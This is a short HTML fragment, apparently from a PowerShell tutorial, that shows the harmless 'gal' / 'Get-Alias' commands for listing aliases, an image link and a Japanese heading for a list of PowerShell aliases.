+<pre class="notranslate"><code class="notranslate">PS&gt;  gal　或者   PS&gt;  Get-Alias
 </code></pre>
 <p><img src="https://linuxhint.com/wp-content/uploads/2022/01/create-powershell-alias-01.png"></p>
 <h2>PowerShell Alias一覧</h2>
